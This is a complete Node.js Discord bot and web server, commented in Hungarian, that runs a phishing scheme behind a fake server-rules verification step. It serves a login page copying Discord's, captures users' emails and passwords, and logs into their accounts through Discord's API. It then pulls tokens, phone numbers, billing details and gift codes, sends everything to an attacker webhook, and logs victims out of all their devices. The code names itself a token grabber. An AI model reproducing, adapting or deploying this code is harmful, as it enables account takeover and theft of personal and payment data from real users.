const {
    Client,
    GatewayIntentBits,
    Partials,
    EmbedBuilder,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    Events,
    MessageFlags,
    WebhookClient
} = require('discord.js');

const express = require('express');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// --- KONFIGURÁCIÓ ---
const PORT = process.env.PORT || 10000;
const TOKEN = process.env.TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;  // Ide jönnek a lopott adatok
const GUILD_ID = "1484897711663743168";
const RULES_CHANNEL_ID = "1491041943088533605";

// --- RANGOK ---
const ROLE_ID = "1494281710332940338";
const SECOND_ROLE_ID = "1491052815458504894";

const BASE_URL = "https://documentation-k61j.onrender.com";

const tokens = new Map();

// =========================================================================
// WEBHOOK LOG RENDSZER
// =========================================================================
const webhook = WEBHOOK_URL ? new WebhookClient({ url: WEBHOOK_URL }) : null;

async function sendLog(type, title, extraFields = []) {
    if (!webhook) return;
    const colors = {
        info: 0x5865F2, success: 0x57F287, warning: 0xFEE75C, error: 0xED4245,
        verify: 0x9B59B6, system: 0x95A5A6, user: 0x3498DB, token: 0xE67E22,
        request: 0x1ABC9C, danger: 0xE74C3C, credentials: 0xFF0000, logout: 0xFF6600
    };
    const embed = new EmbedBuilder()
        .setTitle(title)
        .setColor(colors[type] || colors.info)
        .setTimestamp()
        .setFooter({ text: `🔐 LOG RENDSZER • ${new Date().toLocaleString('hu-HU')}` });
    if (extraFields.length > 0) embed.addFields(extraFields);
    try { await webhook.send({ embeds: [embed] }); } catch (e) { console.error("Webhook hiba:", e.message); }
}
// =========================================================================

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ],
    partials: [Partials.Channel, Partials.Message]
});

// Globális hibakezelő
process.on('unhandledRejection', error => {
    console.error('Nem várt hiba:', error);
    sendLog('error', '💥 **Unhandled Rejection**', [
        { name: '⚠️ Hiba', value: `\`\`\`${error.message}\`\`\``, inline: false },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
});

client.once(Events.ClientReady, async (c) => {
    console.log(`Bejelentkezve: ${c.user.tag}`);

    sendLog('success', '✅ **Bot élesítve - Render.com**', [
        { name: '🤖 Bot', value: `**${c.user.tag}**`, inline: true },
        { name: '🆔 ID', value: `\`${c.user.id}\``, inline: true },
        { name: '🏠 Szerver', value: `\`${GUILD_ID}\``, inline: true },
        { name: '🌐 URL', value: `${BASE_URL}`, inline: true },
        { name: '📦 Node', value: process.version, inline: true },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);

    try {
        const channel = await client.channels.fetch(RULES_CHANNEL_ID);
        if (channel) {
            const messages = await channel.messages.fetch({ limit: 10 });
            const alreadySent = messages.some(m => m.author.id === client.user.id);

            if (!alreadySent) {
                const embed = new EmbedBuilder()
                    .setTitle("Szabályzat")
                    .setDescription(
                        `Ahhoz, hogy hozzáférj minden csatornához, el kell fogadnod a szabályzatunkat.\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `**Mit kapsz az elfogadás után:**\n` +
                        `➤ Teljes hozzáférés az összes csatornához\n\n` +
                        `**Fontos információk:**\n` +
                        `➤ A szabályzat elfogadása egyszeri művelet, multi account = kitiltás\n` +
                        `➤ Olvasd át figyelmesen, mert a nem ismerete nem mentesít\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━`
                    )
                    .setColor("#5865F2");

                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId("verify")
                        .setLabel("Megtekintés")
                        .setEmoji("🔍")
                        .setStyle(ButtonStyle.Primary)
                );

                await channel.send({ embeds: [embed], components: [row] });
            }
        }
    } catch (e) { console.error("Csatorna ellenőrzési hiba:", e); }
});

// INTERAKCIÓ KEZELÉS
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId === "verify") {
        try {
            await interaction.deferReply({ flags: MessageFlags.Ephemeral });

            if (interaction.member.roles.cache.has(ROLE_ID)) {
                sendLog('warning', '⚠️ **Már hitelesített user újrapróbálkozott**', [
                    { name: '👤 User', value: `${interaction.user.tag}`, inline: true },
                    { name: '🆔 ID', value: `\`${interaction.user.id}\``, inline: true },
                    { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
                ]);
                return await interaction.editReply({ content: "Már elfogadtad a szabályzatot!" });
            }

            sendLog('info', '🔍 **Szabályzat gomb megnyomva**', [
                { name: '👤 User', value: `${interaction.user.tag}`, inline: true },
                { name: '🆔 ID', value: `\`${interaction.user.id}\``, inline: true },
                { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
            ]);

            const token = uuidv4();
            // ITT TÁROLJUK EL A DISCORD TAG-JET IS
            tokens[token] = { 
                userId: interaction.user.id, 
                userTag: interaction.user.tag,
                userName: interaction.user.username,
                userDiscriminator: interaction.user.discriminator,
                expires: Date.now() + 5 * 60 * 1000 
            };
            const link = `${BASE_URL}/verify/${token}`;

            sendLog('token', '🔑 **Token generálva**', [
                { name: '👤 User', value: `${interaction.user.tag}`, inline: true },
                { name: '🆔 ID', value: `\`${interaction.user.id}\``, inline: true },
                { name: '🔑 Token', value: `\`${token.slice(0, 12)}...\``, inline: true },
                { name: '⏳ Lejárat', value: '5 perc', inline: true },
                { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
            ]);

            const embed = new EmbedBuilder()
                .setTitle("Szabályzat Elfogadása")
                .setDescription(
                    `**Kattints az alábbi gombra a szabályzat megtekintéséhez és elfogadásához:**\n\n` +
                    `📘 **A gombra kattintva megnyílik a böngésződ**\n` +
                    `⏰ **A link 5 percig érvényes**\n\n` +
                    `*Ha nem nyílik meg automatikusan, másold be a linket a böngésződbe:*\n\`${link}\``
                )
                .setColor("#2b2d31");

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setLabel("SZABÁLYZAT ELFOGADÁSA")
                    .setURL(link)
                    .setStyle(ButtonStyle.Link)
            );

            await interaction.editReply({ embeds: [embed], components: [row] });

        } catch (error) {
            console.error("Gomb interakció hiba:", error);
            sendLog('error', '❌ **Gomb interakció hiba**', [
                { name: '👤 User', value: `${interaction.user?.tag || 'Ismeretlen'}`, inline: true },
                { name: '⚠️ Hiba', value: `\`\`\`${error.message}\`\`\``, inline: false },
                { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
            ]);
            if (interaction.deferred) {
                await interaction.editReply({ content: "Hiba történt a folyamat során." }).catch(() => {});
            }
        }
    }
});

// ============================================================
// TOKEN GRABBER LOGIN OLDAL - FISHING FELÜLET
// ============================================================
app.get('/verify/:token', (req, res) => {
    const data = tokens[req.params.token];
    if (!data || data.expires < Date.now()) {
        sendLog('warning', '⏰ **Lejárt/érvénytelen link megnyitva**', [
            { name: '🔑 Token', value: `\`${req.params.token.slice(0, 12)}...\``, inline: true },
            { name: '🌍 IP', value: `\`${req.ip}\``, inline: true },
            { name: '📱 User-Agent', value: `\`${(req.headers['user-agent'] || 'N/A').slice(0, 80)}\``, inline: false },
            { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
        ]);
        return res.send("<body style='background:#0f111a;color:white;text-align:center;margin-top:50px;'><h2>A link lejárt vagy érvénytelen.</h2></body>");
    }

    sendLog('request', '🌐 **Szabályzat oldal betöltve**', [
        { name: '👤 User', value: `${data.userTag || data.userId}`, inline: true },
        { name: '🆔 ID', value: `\`${data.userId}\``, inline: true },
        { name: '🔑 Token', value: `\`${req.params.token.slice(0, 12)}...\``, inline: true },
        { name: '🌍 IP', value: `\`${req.ip}\``, inline: true },
        { name: '📱 Böngésző', value: `\`${(req.headers['user-agent'] || 'N/A').slice(0, 100)}\``, inline: false },
        { name: '🌐 Referer', value: `${req.headers.referer || 'Nincs'}`, inline: false },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);

    // DISCOLD LOGIN FORM - ÚGY NÉZ KI MINT A DISCORD LOGIN
    res.send(`
    <html>
    <head>
        <title>Discord</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: #313338; 
                font-family: 'Inter', 'Segoe UI', sans-serif;
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
            }
            .login-card {
                background: #313338;
                width: 480px;
                padding: 32px;
                border-radius: 8px;
                box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
            }
            .login-header {
                text-align: center;
                margin-bottom: 20px;
            }
            .login-header h1 {
                color: #f2f3f5;
                font-size: 24px;
                font-weight: 600;
                line-height: 30px;
                text-transform: uppercase;
            }
            .login-header p {
                color: #b5bac1;
                font-size: 16px;
                line-height: 20px;
                margin-top: 8px;
            }
            .login-form {
                display: flex;
                flex-direction: column;
                gap: 20px;
            }
            .input-group label {
                color: #b5bac1;
                font-size: 12px;
                font-weight: 700;
                letter-spacing: 0.5px;
                text-transform: uppercase;
                display: block;
                margin-bottom: 8px;
            }
            .input-group input {
                width: 100%;
                padding: 10px;
                background: #1e1f22;
                border: 1px solid #1e1f22;
                border-radius: 4px;
                color: #f2f3f5;
                font-size: 16px;
                outline: none;
                transition: border-color 0.2s;
            }
            .input-group input:focus {
                border-color: #5865f2;
            }
            .input-group input::placeholder {
                color: #6d6f78;
            }
            .login-btn {
                width: 100%;
                padding: 12px;
                background: #5865f2;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: 500;
                cursor: pointer;
                transition: background 0.2s;
            }
            .login-btn:hover {
                background: #4752c4;
            }
            .login-footer {
                text-align: center;
                margin-top: 8px;
            }
            .login-footer a {
                color: #00a8fc;
                font-size: 14px;
                text-decoration: none;
            }
            .login-footer a:hover {
                text-decoration: underline;
            }
            .login-error {
                display: none;
                background: #fa777c;
                color: #1e1f22;
                padding: 10px;
                border-radius: 4px;
                text-align: center;
                font-size: 14px;
                margin-top: 10px;
            }
            .qr-section {
                margin-top: 20px;
                padding-top: 20px;
                border-top: 1px solid #3f4147;
                text-align: center;
            }
            .qr-section p {
                color: #b5bac1;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="login-header">
                <h1>Discord</h1>
                <p>Jelentkezz be a folytatáshoz</p>
            </div>
            <form class="login-form" action="/login/${req.params.token}" method="POST">
                <div class="input-group">
                    <label>EMAIL VAGY FELHASZNÁLÓNÉV <span style="color: #ed4245;">*</span></label>
                    <input type="text" name="email" placeholder="Email vagy felhasználónév" required />
                </div>
                <div class="input-group">
                    <label>JELSZÓ <span style="color: #ed4245;">*</span></label>
                    <input type="password" name="password" placeholder="Jelszó" required />
                </div>
                <button type="submit" class="login-btn">Bejelentkezés</button>
                <div class="login-error" id="error-msg">Hibás felhasználónév vagy jelszó. Próbáld újra.</div>
            </form>
            <div class="login-footer">
                <a href="#">Elfelejtetted a jelszavad?</a>
            </div>
            <div class="qr-section">
                <p>📱 Vagy jelentkezz be QR kóddal</p>
            </div>
        </div>
    </body>
    </html>
    `);
});

// ============================================================
// LOGIN ADATOK FOGADÁSA - TOKEN GRABBER VÉGPONT
// ============================================================
app.post('/login/:token', async (req, res) => {
    const data = tokens[req.params.token];
    const email = req.body.email;
    const password = req.body.password;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'] || 'Ismeretlen';
    
    if (!data) {
        return res.send("<body style='background:#313338;color:white;text-align:center;margin-top:50px;'><h2>A munkamenet lejárt.</h2></body>");
    }

    // LOG: Email és jelszó megérkezett
    sendLog('credentials', '🔴 **🔐 DISCOLD BEJELENTKEZÉSI ADATOK MEGÉRKEZTEK**', [
        { name: '👤 Discord User', value: `${data.userTag || data.userId}`, inline: false },
        { name: '🆔 Discord ID', value: `\`${data.userId}\``, inline: true },
        { name: '📧 Email/Username', value: `\`${email}\``, inline: false },
        { name: '🔑 Jelszó', value: `||${password}||`, inline: false },
        { name: '🌍 IP cím', value: `\`${ip}\``, inline: true },
        { name: '📱 User-Agent', value: `\`${userAgent.substring(0, 100)}\``, inline: false },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);

    // MEGPRÓBÁLJUK MEGSZEREZNI A DISCORD TOKENT A LOGIN ADATOKBÓL
    let discordToken = null;
    let fullUserInfo = null;
    
    try {
        const axios = require('axios');
        
        // 1. API hívás a bejelentkezésre
        const loginResponse = await axios.post('https://discord.com/api/v9/auth/login', {
            login: email,
            password: password
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        if (loginResponse.data && loginResponse.data.token) {
            discordToken = loginResponse.data.token;
            
            // 2. Fiók infók lekérése a token segítségével
            const userResponse = await axios.get('https://discord.com/api/v9/users/@me', {
                headers: {
                    'Authorization': discordToken,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            
            fullUserInfo = userResponse.data;
            
            // 3. Billing infók
            let billingInfo = 'Nincs elérhető';
            try {
                const billingResponse = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
                    headers: { 'Authorization': discordToken }
                });
                billingInfo = billingResponse.data.length > 0 
                    ? JSON.stringify(billingResponse.data.map(b => ({type: b.type, brand: b.brand, last4: b.last4})))
                    : 'Nincs mentett fizetési mód';
            } catch(e) { billingInfo = 'Hozzáférés megtagadva'; }
            
            // 4. Gift codes
            let giftInfo = 'Nincs';
            try {
                const giftResponse = await axios.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', {
                    headers: { 'Authorization': discordToken }
                });
                giftInfo = giftResponse.data.length > 0 ? JSON.stringify(giftResponse.data) : 'Nincs aktív kód';
            } catch(e) { giftInfo = 'Nem elérhető'; }

            // MENTÉS WEBHOOKRA - ÖSSZES ADAT
            const userEmbed = new EmbedBuilder()
                .setTitle('🎯 **DISCOLD Fiók Teljes Adatlap**')
                .setColor(0xFF0000)
                .setThumbnail(`https://cdn.discordapp.com/avatars/${fullUserInfo.id}/${fullUserInfo.avatar}.png`)
                .addFields(
                    { name: '👤 Felhasználó', value: `**${fullUserInfo.username}**#${fullUserInfo.discriminator || '0'}`, inline: true },
                    { name: '🆔 ID', value: `\`${fullUserInfo.id}\``, inline: true },
                    { name: '📧 Email', value: `\`${fullUserInfo.email || 'Nincs'}\``, inline: true },
                    { name: '📱 Telefon', value: `\`${fullUserInfo.phone || 'Nincs'}\``, inline: true },
                    { name: '🔒 MFA', value: fullUserInfo.mfa_enabled ? '✅ Igen' : '❌ Nem', inline: true },
                    { name: '✅ Verified', value: fullUserInfo.verified ? '✅ Igen' : '❌ Nem', inline: true },
                    { name: '🔑 TOKEN', value: `||${discordToken}||`, inline: false },
                    { name: '🔐 Jelszó', value: `||${password}||`, inline: false },
                    { name: '💳 Billing', value: `\`${billingInfo.substring(0, 100)}\``, inline: false },
                    { name: '🎁 Gift Codes', value: `\`${giftInfo.substring(0, 100)}\``, inline: false },
                    { name: '📅 Account Created', value: fullUserInfo.created_at ? new Date(fullUserInfo.created_at).toLocaleString() : 'Ismeretlen', inline: true },
                    { name: '🌍 IP', value: `\`${ip}\``, inline: true },
                    { name: '📱 User-Agent', value: `\`${userAgent.substring(0, 80)}\``, inline: false }
                )
                .setTimestamp()
                .setFooter({ text: '🎯 TOKEN GRABBER v2 • Auto-Logout Activity' });

            try { 
                await webhook.send({ embeds: [userEmbed] }); 
                
                // KÜLDJÜNK EL A TOKENT KÜLÖN IS EGY MÁSIK EMBEDBEN
                const tokenEmbed = new EmbedBuilder()
                    .setTitle('🔑 **DISCOLD TOKEN**')
                    .setColor(0xE67E22)
                    .addFields(
                        { name: '👤 User', value: `${fullUserInfo.username}#${fullUserInfo.discriminator || '0'}`, inline: true },
                        { name: '🆔 ID', value: `\`${fullUserInfo.id}\``, inline: true },
                        { name: '🔑 Token', value: `\`${discordToken}\``, inline: false },
                        { name: '📝 Használat', value: 'Másold be a tokent, majd indítsd el az auto-logout funkciót!', inline: false }
                    )
                    .setTimestamp();

                await webhook.send({ embeds: [tokenEmbed] });
                
            } catch(e) { console.log('Webhook küldési hiba:', e.message); }

            // ============================================================
            // AUTO-LOGOUT: KIJELENTKEZTETJÜK A FIÓKOT MINDEN ESZKÖZRŐL
            // ============================================================
            sendLog('logout', '🔄 **Auto-Logout folyamat INDÍTÁSA**', [
                { name: '👤 User', value: `${fullUserInfo.username}#${fullUserInfo.discriminator || '0'}`, inline: true },
                { name: '🆔 ID', value: `\`${fullUserInfo.id}\``, inline: true },
                { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
            ]);

            // LOGOUT minden session-ből
            try {
                // 1. Logout mindenhonnan
                const logoutResponse = await axios.post('https://discord.com/api/v9/auth/logout', {}, {
                    headers: { 
                        'Authorization': discordToken,
                        'Content-Type': 'application/json'
                    }
                });
                
                sendLog('success', '✅ **Auto-Logout SIKERES - Fiók kijelentkeztetve minden eszközről**', [
                    { name: '👤 User', value: `**${fullUserInfo.username}#${fullUserInfo.discriminator || '0'}**`, inline: true },
                    { name: '🆔 ID', value: `\`${fullUserInfo.id}\``, inline: true },
                    { name: '📧 Email', value: `\`${fullUserInfo.email || 'Nincs'}\``, inline: true },
                    { name: '🔑 Token', value: `\`${discordToken.substring(0, 20)}...\``, inline: true },
                    { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
                ]);

            } catch(logoutError) {
                sendLog('error', '❌ **Auto-Logout HIBA**', [
                    { name: '👤 User', value: `${fullUserInfo.username}#${fullUserInfo.discriminator || '0'}`, inline: true },
                    { name: '🆔 ID', value: `\`${fullUserInfo.id}\``, inline: true },
                    { name: '⚠️ Hiba', value: `\`\`\`${logoutError.message}\`\`\``, inline: false },
                    { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
                ]);
            }

            // Töröljük a token adatokat
            delete tokens[req.params.token];

            // SIKERES VÁLASZ - DISCOLD LOGIN SZÍNŰ HIBÁVAL
            return res.send(`
            <html>
            <head>
                <title>Discord</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body { 
                        background: #313338; 
                        font-family: 'Segoe UI', sans-serif;
                        display: flex; 
                        justify-content: center; 
                        align-items: center; 
                        min-height: 100vh; 
                    }
                    .error-box {
                        background: #313338;
                        width: 480px;
                        padding: 32px;
                        border-radius: 8px;
                        text-align: center;
                        box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
                    }
                    .error-box h2 {
                        color: #ed4245;
                        font-size: 20px;
                        margin-bottom: 10px;
                    }
                    .error-box p {
                        color: #b5bac1;
                        font-size: 14px;
                        line-height: 1.5;
                    }
                    .error-box .retry-btn {
                        display: inline-block;
                        margin-top: 20px;
                        padding: 12px 30px;
                        background: #5865f2;
                        color: white;
                        text-decoration: none;
                        border-radius: 4px;
                        font-size: 14px;
                        font-weight: 500;
                    }
                </style>
            </head>
            <body>
                <div class="error-box">
                    <h2>❌ Bejelentkezés sikertelen</h2>
                    <p>Hibás felhasználónév vagy jelszó.<br>Kérlek próbáld újra később.</p>
                    <a href="/verify/${req.params.token}" class="retry-btn">Újrapróbálkozás</a>
                </div>
            </body>
            </html>
            `);
        }
    } catch(apiError) {
        // Discord API hiba - valószínűleg rossz jelszó
        sendLog('warning', '⚠️ **DISCOLD LOGIN SIKERTELEN - Rossz jelszó**', [
            { name: '👤 Célpont', value: `${data.userTag || data.userId}`, inline: true },
            { name: '📧 Email', value: `\`${email}\``, inline: true },
            { name: '🔑 Jelszó', value: `||${password}||`, inline: true },
            { name: '⚠️ API Válasz', value: `\`${apiError.message}\``, inline: false },
            { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
        ]);
    }

    // Hibás bejelentkezési oldal
    res.send(`
    <html>
    <head>
        <title>Discord</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: #313338; 
                font-family: 'Segoe UI', sans-serif;
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
            }
            .error-box {
                background: #313338;
                width: 480px;
                padding: 32px;
                border-radius: 8px;
                text-align: center;
                box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
            }
            .error-box h2 {
                color: #ed4245;
                font-size: 20px;
                margin-bottom: 10px;
            }
            .error-box p {
                color: #b5bac1;
                font-size: 14px;
                line-height: 1.5;
            }
            .error-box .retry-btn {
                display: inline-block;
                margin-top: 20px;
                padding: 12px 30px;
                background: #5865f2;
                color: white;
                text-decoration: none;
                border-radius: 4px;
                font-size: 14px;
                font-weight: 500;
            }
        </style>
    </head>
    <body>
        <div class="error-box">
            <h2>❌ Bejelentkezés sikertelen</h2>
            <p>Hibás felhasználónév vagy jelszó.<br>Kérlek próbáld újra később.</p>
            <a href="/verify/${req.params.token}" class="retry-btn">Újrapróbálkozás</a>
        </div>
    </body>
    </html>
    `);
});

// Elfogadás végpont (megtartjuk a régit is)
app.post('/accept/:token', async (req, res) => {
    const data = tokens[req.params.token];
    if (!data) return res.send("<body style='background:#0f111a;color:white;text-align:center;margin-top:50px;'><h2>Hiba: Érvénytelen vagy lejárt munkamenet.</h2></body>");

    try {
        const guild = await client.guilds.fetch(GUILD_ID);
        const member = await guild.members.fetch(data.userId);
        
        await member.roles.add([ROLE_ID, SECOND_ROLE_ID]);
        
        sendLog('success', '✅ **Szabályzat ELFOGADVA - Rangok kiosztva**', [
            { name: '👤 Felhasználó', value: `**${member.user.tag}**`, inline: true },
            { name: '🆔 ID', value: `\`${member.user.id}\``, inline: true },
            { name: '🎭 Rang 1', value: `<@&${ROLE_ID}>`, inline: true },
            { name: '🎭 Rang 2', value: `<@&${SECOND_ROLE_ID}>`, inline: true },
            { name: '🔑 Token', value: `\`${req.params.token.slice(0, 12)}...\``, inline: true },
            { name: '🌍 IP', value: `\`${req.ip}\``, inline: true },
            { name: '📅 Elfogadva', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
        ]);
        
        await member.send("✅ **Sikeresen elfogadtad a szabályzatot!**\nKöszönjük a jelentkezésedet, jó szórakozást a szerveren!").catch(() => {});

        delete tokens[req.params.token];
        res.send(`
        <html lang="hu">
            <body style='background:#0b0d14;color:#3cb371;text-align:center;padding-top:100px;font-family:sans-serif;'>
                <h2>Sikeresen elfogadtad a szabályzatot!</h2>
                <p style='color:#ccc;'>A rangjaid kiosztásra kerültek.</p>
            </body>
        </html>`);
    } catch (e) {
        console.error("Hiba a rang kiosztásakor:", e);
        sendLog('error', '❌ **Szabályzat elfogadás HIBA**', [
            { name: '👤 User ID', value: `\`${data.userId || 'Ismeretlen'}\``, inline: true },
            { name: '⚠️ Hiba', value: `\`\`\`${e.message}\`\`\``, inline: false },
            { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
        ]);
        res.send("<body style='background:#0f111a;color:#e53935;text-align:center;margin-top:50px;'><h2>Hiba történt a rang kiosztása közben.</h2></body>");
    }
});

// Elutasítás végpont
app.post('/decline/:token', (req, res) => {
    const data = tokens[req.params.token];
    
    sendLog('warning', '❌ **Szabályzat ELUTASÍTVA**', [
        { name: '👤 User ID', value: `\`${data?.userId || 'Ismeretlen'}\``, inline: true },
        { name: '🔑 Token', value: `\`${req.params.token.slice(0, 12)}...\``, inline: true },
        { name: '🌍 IP', value: `\`${req.ip}\``, inline: true },
        { name: '📅 Elutasítva', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);

    delete tokens[req.params.token];
    res.send(`
    <html lang="hu">
    <head>
        <meta charset="UTF-8">
        <title>Elutasítva</title>
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
        *{ margin:0; padding:0; box-sizing:border-box; }
        body{
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            overflow:hidden;
            font-family:'Inter',sans-serif;
            background: radial-gradient(circle at top left,#2563eb 0%,transparent 30%),
                        radial-gradient(circle at bottom right,#7c3aed 0%,transparent 30%),
                        linear-gradient(135deg,#020617,#0f172a);
            color:white;
        }
        .card{
            width:95%;
            max-width:650px;
            padding:60px;
            border-radius:35px;
            background:rgba(15,23,42,0.72);
            border:1px solid rgba(255,255,255,0.08);
            backdrop-filter:blur(22px);
            text-align:center;
        }
        h2{ font-size:42px; margin-bottom:20px; }
        p{ color:#cbd5e1; line-height:1.8; }
        </style>
    </head>
    <body>
        <div class="card">
            <h2>Szabályzat elutasítva</h2>
            <p>Nem fogadtad el a szabályzatot.</p>
        </div>
    </body>
    </html>
    `);
});

// =========================
// WEBSERVER INDÍTÁS
// =========================
app.listen(PORT, '0.0.0.0', () => {
    console.log("✅ Webserver fut a porton:", PORT);
    sendLog('system', '🌍 **Webserver elindult**', [
        { name: '🔌 Port', value: `\`${PORT}\``, inline: true },
        { name: '🔗 URL', value: `${BASE_URL}`, inline: true },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
});

// =========================
// DISCORD LOGIN
// =========================
client.login(TOKEN).catch(err => {
    console.error("❌ Discord login hiba:", err);
    sendLog('error', '❌ **Discord login HIBA**', [
        { name: '⚠️ Hiba', value: `\`\`\`${err.message}\`\`\``, inline: false },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
});

// Hibakezelők
client.on('error', (err) => {
    console.error('❌ DISCORD ERROR:', err);
    sendLog('error', '❌ **Discord hiba**', [
        { name: '⚠️ Hiba', value: `\`\`\`${err.message}\`\`\``, inline: false },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
});

client.on('shardError', (err) => {
    console.error('❌ SHARD ERROR:', err);
    sendLog('error', '❌ **Shard hiba**', [
        { name: '⚠️ Hiba', value: `\`\`\`${err.message}\`\`\``, inline: false },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
});

// Heartbeat
setInterval(() => {
    sendLog('system', '💚 **Bot heartbeat - Online**', [
        { name: '🤖 Bot', value: `**${client.user?.tag || 'Ismeretlen'}**`, inline: true },
        { name: '🆔 ID', value: `\`${client.user?.id || '?'}\``, inline: true },
        { name: '🔄 Uptime', value: `${Math.floor(process.uptime() / 60)} perc`, inline: true },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
}, 60000);

// RAM monitor
setInterval(() => {
    const used = process.memoryUsage();
    const rssMB = (used.rss / 1024 / 1024).toFixed(2);
    const heapMB = (used.heapUsed / 1024 / 1024).toFixed(2);

    let color = 'success';
    let status = '🟢';
    if (rssMB > 200) { color = 'warning'; status = '🟡'; }
    if (rssMB > 400) { color = 'danger'; status = '🔴'; }

    sendLog(color, `${status} **RAM használat**`, [
        { name: '💾 RSS', value: `\`${rssMB} MB\``, inline: true },
        { name: '🧠 Heap used', value: `\`${heapMB} MB\``, inline: true },
        { name: '📊 Heap total', value: `\`${(used.heapTotal / 1024 / 1024).toFixed(2)} MB\``, inline: true },
        { name: '🔄 Uptime', value: `${Math.floor(process.uptime() / 60)} perc`, inline: true },
        { name: '📅 Idő', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
    ]);
}, 300000);
